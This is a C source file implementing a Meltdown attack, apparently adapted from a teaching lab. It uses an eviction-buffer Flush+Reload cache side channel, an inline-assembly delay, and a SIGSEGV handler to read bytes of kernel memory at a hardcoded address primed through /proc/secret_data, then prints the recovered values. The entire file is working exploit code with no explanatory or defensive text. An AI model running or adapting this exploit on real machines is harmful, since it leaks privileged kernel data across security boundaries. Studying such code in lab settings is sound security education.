#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <fcntl.h>
#include <emmintrin.h>    // 需要_mm_pause用于时序测量
#include <x86intrin.h>    // 需要__rdtscp

/*********************** Flush + Reload ************************/
uint8_t array[256*4096];

/* cache hit time threshold assumed */
#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

// 增加一个eviction buffer用于cache eviction
#define EVICTION_BUFFER_SIZE (1024*1024)
uint8_t eviction_buffer[EVICTION_BUFFER_SIZE];

// 用cache eviction方法"flush"缓存
void flushSideChannel()
{
    int i;

    // 确保array在RAM里
    for (i = 0; i < 256; i++)
        array[i*4096 + DELTA] = 1;

    // 通过访问eviction_buffer大量不同地址驱逐cache
    // 步长为64假定cache line为64字节
    for (i = 0; i < EVICTION_BUFFER_SIZE; i += 64)
        eviction_buffer[i]++;
}

// 清理探测 array 的缓存（用于 reload 前可选）
void flushProbeArray()
{
    // 用同样方法把 array 驱逐出cache
    for (int i = 0; i < EVICTION_BUFFER_SIZE; i += 64)
        eviction_buffer[i]++;
}
/*********************** Flush + Reload ************************/

static int scores[256];

void reloadSideChannelImproved()
{
    int i;
    volatile uint8_t *addr;
    register uint64_t time1, time2;
    int junk = 0;
    for (i = 0; i < 256; i++)
    {
        addr = &array[i * 4096 + DELTA];
        time1 = __rdtscp(&junk);
        junk = *addr;
        time2 = __rdtscp(&junk) - time1;
        if (time2 <= CACHE_HIT_THRESHOLD)
            scores[i]++; /* if cache hit, add 1 for this value */
    }
}

void meltdown_asm(unsigned long kernel_data_addr)
{
    char kernel_data = 0;

    // 给eax“做点事”，增加乱序窗口
    asm volatile(
        ".rept 400;"                
        "add $0x141, %%eax;"
        ".endr;"                    
        :
        :
        : "eax"
    );

    // 触发异常读
    kernel_data = *(char*)kernel_data_addr;
    array[kernel_data * 4096 + DELTA] += 1;
}

// signal handler
static sigjmp_buf jbuf;
static void catch_segv()
{
    siglongjmp(jbuf, 1);
}

int main()
{
    int i, j, ret = 0;

    // Register signal handler
    signal(SIGSEGV, catch_segv);

    int fd = open("/proc/secret_data", O_RDONLY);
    if (fd < 0) {
        perror("open");
        return -1;
    }

    for (int k = 0; k < 8; k++)
    {
        memset(scores, 0, sizeof(scores));
        flushSideChannel();

        // Retry 1000 times on the same address.
        for (i = 0; i < 1000; i++)
        {
            ret = pread(fd, NULL, 0, 0);
            if (ret < 0)
            {
                perror("pread");
                break;
            }

            // flush the probing array (替换clflush方法)
            flushProbeArray();

            if (sigsetjmp(jbuf, 1) == 0)
            {
                meltdown_asm(0xf865a00 + k);	// 地址每次+1
            }

            reloadSideChannelImproved();
        }

        // Find the index with the highest score.
        int max = 0;
        for (i = 0; i < 256; i++)
        {
            if (scores[max] < scores[i])
                max = i;
        }

        printf("The secret value is %d %c\n", max, max);
        printf("The number of hits is %d\n", scores[max]);
    }

    return 0;
}